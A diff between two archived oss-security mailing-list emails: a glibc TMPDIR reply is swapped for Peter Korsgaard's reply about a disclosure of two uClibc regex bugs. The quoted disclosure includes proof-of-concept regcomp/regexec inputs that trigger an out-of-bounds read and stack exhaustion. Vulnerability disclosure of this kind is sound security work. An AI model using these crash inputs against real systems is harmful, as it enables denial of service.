@@ -1,9 +1,9 @@
 X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["760" "Monday" "6" "November" "2017" "22:14:32" "+0100" "Jakub Wilk" "jwilk@jwilk.net" "<20171106211432.pfwrhchhbrncqggo@jwilk.net>" "16" "Re: [oss-security] Security risk of vim swap files" "^Date:" nil nil "11" "2017110621:14:32" "[oss-security] Security risk of vim swap files" (number mark "        jwilk@jwilk. Nov  6   16/760   " thread-indent "\"Re: [oss-security] Security risk of vim swap files\"\n") "<20171106200050.GA19402@openwall.com>" ("<20171031132352.2df6d2ad@pc1>" "<20171031175407.jcniviupwyab6qcl@sentinelchicken.org>" "<20171101023330.GK30551@takahe.colorado.edu>" "<20171101144927.srk7stiwoia4qt57@sentinelchicken.org>" "<CAH8yC8=KKh8SPtDUUSAL_GuDHT7eYBrmHvVjzeQ5n4ocFh4m5Q@mail.gmail.com>" "<20171101180222.5j6wqmmqakwvu72q@jwilk.net>" "<20171101181209.GB22752@openwall.com>" "<20171106061544.apbxborivf4lye7m@matica.foolinux.mooo.com>" "<20171106200050.GA19402@openwall.com>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["2011" "Friday" "16" "June" "2017" "15:12:46" "+0200" "Peter Korsgaard" "peter@korsgaard.com" "<8760fwhy9d.fsf@dell.be.48ers.dk>" "71" "Re: [oss-security] two vulns in  uClibc-0.9.33.2" "^Cc:" nil nil "6" "2017061613:12:46" "[oss-security] two vulns in uClibc-0.9.33.2" (number mark "        peter@korsga Jun 16   71/2011  " thread-indent "\"Re: [oss-security] two vulns in  uClibc-0.9.33.2\"\n") "<tencent_18C312B86EA079DA42B11D83@qq.com>" ("<tencent_18C312B86EA079DA42B11D83@qq.com>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
 	nil)
 X-Mozilla-Status: 0001
 X-Mozilla-Status2: 00000000
-Received: (qmail 21631 invoked by uid 550); 6 Nov 2017 21:14:51 -0000
+Received: (qmail 17898 invoked by uid 550); 16 Jun 2017 13:46:49 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -11,46 +11,116 @@ List-Help: <mailto:oss-security-help@lists.openwall.com>
 List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
-Received: (qmail 21610 invoked from network); 6 Nov 2017 21:14:51 -0000
-Message-ID: <20171106211432.pfwrhchhbrncqggo@jwilk.net>
-Mail-Followup-To: oss-security@lists.openwall.com
-References: <20171031132352.2df6d2ad@pc1>
- <20171031175407.jcniviupwyab6qcl@sentinelchicken.org>
- <20171101023330.GK30551@takahe.colorado.edu>
- <20171101144927.srk7stiwoia4qt57@sentinelchicken.org>
- <CAH8yC8=KKh8SPtDUUSAL_GuDHT7eYBrmHvVjzeQ5n4ocFh4m5Q@mail.gmail.com>
- <20171101180222.5j6wqmmqakwvu72q@jwilk.net>
- <20171101181209.GB22752@openwall.com>
- <20171106061544.apbxborivf4lye7m@matica.foolinux.mooo.com>
- <20171106200050.GA19402@openwall.com>
+Received: (qmail 29852 invoked from network); 16 Jun 2017 13:13:01 -0000
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=gmail.com; s=20161025;
+        h=sender:from:to:cc:subject:references:date:in-reply-to:message-id
+         :user-agent:mime-version;
+        bh=VpivsViFxasAp+UEBeAEdmAVKwv7yxfkWOD42B2eA+c=;
+        b=qCD2LqBicKWYo8XOF2kEuqD5vJOvdNRyKWQR5N+nKuneJUr5osgrEqh9OYd1wgmNOu
+         y7gIPSejdP7lBHFUd9PPosBUzPkZ04wJkr86GHDAx/P4KiIToQzDO+8CLfmQvTkJJMid
+         oZI3CzYqUQ0z7bMacYgnGPOoMalcE4vY8q2155G/nOSL/bNBN6XNXPWzG6NiP0yGxCtA
+         Jw2x1OhBNEO+xlb0WJv4BrApoGLnN4tJ7n/quk/4vPmTF5tZe008eAFrc1tffSLNskM0
+         VLKHZqCE1/HdF2tPKW6afCDteK6mr67FOy4vOEn+qosCL/DsDTE+QLT/lRFe6PWdbKAS
+         g+Iw==
+X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=1e100.net; s=20161025;
+        h=x-gm-message-state:sender:from:to:cc:subject:references:date
+         :in-reply-to:message-id:user-agent:mime-version;
+        bh=VpivsViFxasAp+UEBeAEdmAVKwv7yxfkWOD42B2eA+c=;
+        b=bmWMi7QS+T2WqJxiiM+KMqRLeBaEWByZgYkxCvoAIGplknp6M0WhswNlx3CWcM/r/U
+         gBwbaUQ7hn7HuqNyw61ZVPXYGJ1ivZFrSnQqlnZSw+lEwhSpV8iMkg6afa6eJ1WHN17x
+         PxMAozZJEmcDS29VxxzJoSxZ5cY/rAIKo6ZMuEVRVm/v8f2KYXDNJABBIah8iyHTcTUE
+         nTJBZw5M6EAyDDxpRHHpE3huBU5aqHxVP+zGUcmfQa68leyVy+TN3yYrPS0KEiaKwkoE
+         CufqBGgEMh0p7YHsl4hT3dk1wsJHin0WjfyjQJJf1dYyx7I1M1KwSQjD5sj6y+UtcSua
+         EiAg==
+X-Gm-Message-State: AKS2vOx1gTzyymwdn+hAgErLhiLQ3nHHweSP3P/WgtHKkFNSv46cLjqe
+	oF9MKJAgEM2guQ==
+X-Received: by 10.80.216.136 with SMTP id p8mr7486964edj.136.1497618769925;
+        Fri, 16 Jun 2017 06:12:49 -0700 (PDT)
+References: <tencent_18C312B86EA079DA42B11D83@qq.com>
+In-Reply-To: <tencent_18C312B86EA079DA42B11D83@qq.com> (fefe's message of
+	"Fri, 16 Jun 2017 11:53:09 +0800")
+Message-ID: <8760fwhy9d.fsf@dell.be.48ers.dk>
+User-Agent: Gnus/5.13 (Gnus v5.13) Emacs/24.5 (gnu/linux)
 MIME-Version: 1.0
-Content-Type: text/plain; charset=us-ascii; format=flowed
-Content-Disposition: inline
-In-Reply-To: <20171106200050.GA19402@openwall.com>
-User-Agent: NeoMutt/20170609 (1.8.3)
-X-Ovh-Tracer-Id: 15041741284276098982
-X-VR-SPAMSTATE: OK
-X-VR-SPAMSCORE: 0
-X-VR-SPAMCAUSE: gggruggvucftvghtrhhoucdtuddrgedttddrheeggddugeefucetufdoteggodetrfdotffvucfrrhhofhhilhgvmecuqfggjfdpvefjgfevmfevgfenuceurghilhhouhhtmecufedttdenuc
-Date: Mon, 6 Nov 2017 22:14:32 +0100
-From: Jakub Wilk <jwilk@jwilk.net>
+Content-Type: text/plain
+Cc: "oss-security" <oss-security@lists.openwall.com>
+Date: Fri, 16 Jun 2017 15:12:46 +0200
+From: Peter Korsgaard <peter@korsgaard.com>
 Reply-To: oss-security@lists.openwall.com
-Subject: Re: [oss-security] Security risk of vim swap files
-To: oss-security@lists.openwall.com
+Sender: Peter Korsgaard <jacmet@gmail.com>
+Subject: Re: [oss-security] two vulns in  uClibc-0.9.33.2
+To: "fefe" <qbenjin@qq.com>, wbx@openadk.org
 
-* Solar Designer <solar@openwall.com>, 2017-11-06, 21:00:
->I don't know what state glibc was in with regard to honoring, ignoring, 
->or unsetting TMPDIR in SUID programs in 1998-1999.
+>>>>> "fefe" == fefe  <qbenjin@qq.com> writes:
 
-glibc's tempnam() did inadvertently honor TMPDIR in setuid/setgid 
-programs, but the bug was fixed in 1996:
-https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=d68171edce96cb59b5cb869f6a82afcc50db00be
+ > I found two vulns in  uClibc-0.9.33.2 (https://uclibc.org/)
 
-In 2000, glibc started unsetting TMPDIR in such programs:
-https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=74955460c5b9f23d7783395ce2478f5b7c5fd876
+uClibc is dead. Active development happens on uClibc-ng. Is uClibc-ng
+also affected by these issues?
 
-Curiously, Hurd implementation of tmpfile() seems to honor TMPDIR:
-https://sourceware.org/git/?p=glibc.git;a=blob;f=sysdeps/mach/hurd/tmpfile.c;h=8bcfb81a104f37f271b18fe2eea3d40f7d101634;hb=HEAD#l40
+
+> one is about line 2682 of get_subexp.c :
+
+I take it you are referring to libc/misc/regex/regexec.c?
+
+
+ > 		if (BE (bkref_str_off >= mctx->input.valid_len, 0))
+ > 		{
+ > 		  /* If we are at the end of the input, we cannot match.  */
+ > 		  if (bkref_str_off >= mctx->input.len)
+ > 		    break;
+
+
+ > 		  err = extend_buffers (mctx);
+ > 		  if (BE (err != REG1_NOERROR, 0))
+ > 		    return err;
+
+
+ > 		  buf = (const char *) re_string_get_buffer (&mctx->input);
+ > 		}
+ > 	      if (buf [bkref_str_off++] != buf[sl_str - 1])
+ > 		break; /* We don't need to search this sub expression
+		
+ > "bkref_str_off >= mctx->input.valid_len" , when  bkref_str_off == mctx->input.valid_len, "buf [bkref_str_off++] != buf[sl_str - 1]" case Out of one bit bounds read
+
+
+ > The poc code like:
+	
+ > 	if(regcomp (&regtmp,"(.+)upper\\1^", REG_EXTENDED|REG_ICASE | REG_NOSUB )==0)
+ > 	{		
+ >         	reg1match_t pmatch[1];
+ > 		regexec(&regtmp, "upperupperupperx",1, pmatch, 0);
+ > 		regfree(&regtmp);
+ > 	}
+
+
+ > The another is aout line 1837 of regexce.c :
+
+
+ > 		check_dst_limits_calc_pos_1 (const re_match_context_t *mctx, int boundaries,
+ > 			     int subexp_idx, int from_node, int bkref_idx)
+ >                 .......
+
+
+ > 		  cpos =
+ > 		    check_dst_limits_calc_pos_1 (mctx, boundaries, subexp_idx,
+ > 						 dst, bkref_idx);
+
+
+		
+ > check_dst_limits_calc_pos_1 recursive calls case DDOS, because of stack exhaustion.
+
+
+ > The poc code like:	
+	
+ > 	if(regcomp (&regtmp,"\x28\x2E\x3F\x3F\x28\x2E\x3F\x29\x5C\x42\x44\x3F\x3F\x28\x2E\x5C\x32\x29\x2A\x5C\x32\x28\x2E\x3F\x29\x5C\x32\x29\x2A\x5C\x32\xBD", REG_EXTENDED|REG_ICASE | REG_NOSUB )==0)
+ > 	{		
+ >         	reg1match_t pmatch[1];
+ > 		regexec(&regtmp, "\x72\xFF\xFF\xFF\xFF\xBD",1, pmatch, 0);
+ > 		regfree(&regtmp);
+ > 	}
 
 -- 
-Jakub Wilk
+Bye, Peter Korsgaard
